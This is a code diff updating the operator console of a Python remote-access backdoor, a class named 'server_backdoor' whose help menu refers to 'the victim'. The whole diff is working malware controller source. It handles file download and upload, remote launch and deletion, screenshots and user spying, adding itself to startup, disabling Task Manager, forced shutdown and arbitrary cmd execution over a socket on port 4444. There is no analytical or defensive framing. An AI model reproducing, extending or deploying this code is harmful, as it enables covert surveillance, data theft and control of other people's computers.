@@ -2,11 +2,12 @@ import os
 import json
 import socket
 import base64
-import filemanager as fm
+import work_manager as wm
 from datetime import datetime
 
 class server_backdoor:
-    file_manager = fm.file_manager()
+    work_manager = wm.manager()
+    list_of_argument_commands = ["download", "edit", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
     def __init__(self, ip, port):
         try:
@@ -26,7 +27,7 @@ class server_backdoor:
             json_data = json.dumps(data)
             self.connection.send(json_data.encode())
         except Exception as e:
-            return "[-] (Server) Couldn't send the data: {}".format(e)
+            return "[-] (Server) Couldn't send the data, {}.".format(e)
 
     def reliable_receive(self):
         json_data = b""
@@ -37,70 +38,90 @@ class server_backdoor:
             except ValueError:
                 continue
             except Exception as e:
-                return "[-] (Server) Couldn't receive the data: {}".format(e)
+                return "[-] (Server) Couldn't receive the data, {}.".format(e)
 
     def execute_remotely(self, command):
         try:
             self.reliable_send(command)    
-            if command[0] == "exit" or command[0] == "e" or self.is_a_shutdown_type(command):
+            if command[0] == "exit" or self.is_a_shutdown_type(command):
                 self.connection.close()
                 exit()
     
             return self.reliable_receive()
         except Exception as e:
-            return "[-] (Server) Couldn't send/receive the data: {}".format(e)
+            return "[-] (Server) Couldn't send/receive the data: {}.".format(e)
 
     def is_a_shutdown_type(self, command):
-        return ((command[0] == "cs" or command[0] == "changestate") and command[1] == "2") or ((command[0] == "cs" or command[0] == "changestate") and command[1] == "3")
+        return (command[0] == "cgstate" and command[1] == "2") or (command[0] == "cgstate" and command[1] == "3")
 
-    def write_file(self, content):
+    def write_file(self, path, content):
         try:
-            path = os.path.abspath(os.getcwd())
-            with open(path + "\\", "wb") as file:
+            with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
                 return "[+] Download successful."            
         except Exception as e:
-            return "[-] (Server) Couldn't write to: {}, {}".format(path, e)
+            return "[-] (Server) Couldn't write to: {}, {}.".format(path, e)
 
     def read_file(self, path):
         try:
             with open(path, "rb") as file:
                 return base64.b64encode(file.read()).decode()
         except Exception as e:
-            return "[-] (Server) Couldn't extract data from: {}, {}".format(path, e)
+            return "[-] (Server) Couldn't extract data from: {}, {}.".format(path, e)
 
     def take_screenshot(self, data):
         try:            
             time = datetime.now()
             file_name = "{}-{}-{}-{}-{}.png".format(time.day, time.month, time.hour, time.minute, time.second)
             
-            self.write_file(file_name, data)            
+            self.write_file(os.getcwd() + "\\" + file_name, data)            
             return "[+] Successfully managed to downlaod and save the screenshot."
         except Exception as e:
-            return "[-] Error during download of the screenshot: {}".format(e)
+            return "[-] Error during download of the screenshot: {}.".format(e)
 
     def help_menu(self):
-        print("\nSystem Commands:")
-        print("D path: Download a file.")
-        print("U path: Upload a file.")
-        print("SM: Send a Message to the victim.")
-        print("EXC path: launch a file.")
-        print("DEL path: Delete the File/Folder specified.")
-        print("R path: Returns the content of the path.")
-        print("PS path: Play a Sound && Q: Stop the Sound.")
-        print("CS/changestate (1): Lock the System.")
-        print("CS/changestate (2): Restart the System")
-        print("CS/changestate (3): Shutdown the System.")
-        print("\nOther Commands:")
-        print("S: Take a Screenshot.")
-        print("ST: Add to Startup.")
-        print("RST: Remove from Startup.")
-        print("TM: Enable/Disable Task Manager.")
-        print("SI: Get Information about the User.")
-        print("You can execute any cmd command.")
+        print("\nCore Commands\n=============\n")
+        print("Command\t\tDescription\n-------\t\t-----------")
+        print("{}\t\t{}".format("help", "Show help menu."))
+        print("{}\t{}".format("download path", "Download a file (to the project's directory)."))
+        print("{}\t{}".format("upload -p path -t target", "Upload a file."))
+        print("{}\t\t{}".format("startup", "Add the program to Startup."))
+        print("{}\t{}".format("rmstartup", "Remove the program from Startup."))
+        print("{}\t\t{}".format("exit", "Exit the program."))
+
+        print("\nFile Commands\n=============\n")
+        print("Command\t\tDescription\n-------\t\t-----------")
+        print("{}\t{}".format("launch path", "Launch a file."))
+        print("{}\t{}".format("del path", "Delete a file/folder."))
+        print("{}\t{}".format("read path", "Read a file's content."))
+        print("{}\t{}".format("edit 1 path", "Delete the content of the file."))
+        print("{}\t{}".format("edit 2 path", "Add text to file."))
+        print("{}\t{}".format("psound path", "Play a sound."))
+        print("{}\t\t{}".format("stsound", "Stop the playing sound."))
+
+        print("\nSpying\n======\n")
+        print("Command\t\tDescription\n-------\t\t-----------")
+        print("{}\t{}".format("screenshot", "Take a screenshot."))
+        print("{}\t\t{}".format("idle", "Get idle time."))
+        print("{}\t\t{}".format("info", "Get Info about the user."))
         
-        print("\nH/help: Help menu")
-        print("E/exit: Exit the program.")
+        print("\nOther Commands\n=============\n")
+        print("Command\t\tDescription\n-------\t\t-----------")
+        print("{}\t\t{}".format("ps", "Display all the processes running."))
+        print("{}\t{}".format("sdmsg msg", "Send a message to the user."))
+        print("{}\t{}".format("tsmanager", "Disable/Enable the Task Manager."))
+        print("{}\t{}".format("cgstate 1", "Lock the system."))
+        print("{}\t{}".format("cgstate 2", "Restart the system."))
+        print("{}\t{}".format("cgstate 3", "Shut down the system."))
+        print("\nYou can execute any cmd command.\n")
+
+    def is_valid(self, cmd_0, rest_of_command):
+        for i in self.list_of_argument_commands:
+            if cmd_0 == i:
+                if len(rest_of_command) == 0:
+                    return False
+        
+        return True 
 
     def run(self):
         self.help_menu()
@@ -108,25 +129,44 @@ class server_backdoor:
             command = input(">> ")
             command = command.split(" ")
             command_0 = command[0].lower()
-
+            
             try:
-                rest_of_sentence = " ".join(command[1:])
-                if command_0 == "h" or command_0 == "help":
-                    self.help_menu()
-                    continue
-                elif command_0 == "u":                    
-                    file_content = self.read_file(rest_of_sentence)
-                    command.append(file_content)
-                
-                result = self.execute_remotely(command)
-                if command_0 == "d" and "[-]" not in result and rest_of_sentence != "":
-                    result = self.write_file(result)
-                elif command_0 == "s" and "[-]" not in result:                    
-                    result = self.take_screenshot(result)        
+                rest_of_command = " ".join(command[1:])
+                if self.is_valid(command_0, rest_of_command):
+                    if command_0 == "help":
+                        self.help_menu()
+                        continue
+                    elif command_0 == "upload":                        
+                        p_index = command.index("-p")
+                        t_index = command.index("-t")
+                        file_path = " ".join(command[p_index + 1: t_index])     #Getting the file we want to upload location
+
+                        file_content = self.read_file(file_path)
+                        command.append(file_content)
+                    elif command_0 == "edit":
+                        if command[1] == "2":                       
+                            data = ""
+                            while True:
+                                txt = input("Enter what to add to the file: (S to stop): ")
+                                if txt.lower() == "s":
+                                    break
+
+                                data += "\n" + txt
+
+                            command.append(data)
+                    
+                    result = self.execute_remotely(command)
+                    if command_0 == "download" and "[-]" not in result and rest_of_command != "":
+                        path = os.getcwd() + "\\" + rest_of_command
+                        result = self.write_file(path, result)
+                    elif command_0 == "screenshot" and "[-]" not in result:
+                        result = self.take_screenshot(result)
+                else:
+                    result = "You wrote incorrectly the command, for help write help."                    
             except Exception as e:
-                result = "\n[-] Error during command execution: {}".format(e)
+                result = "\n[-] (Server) Error during command execution: {}.".format(e)
  
             print(result)
 
-server = server_backdoor("192.168.1.107", 4444)
+server = server_backdoor("192.168.1.112", 4444)
 server.run()
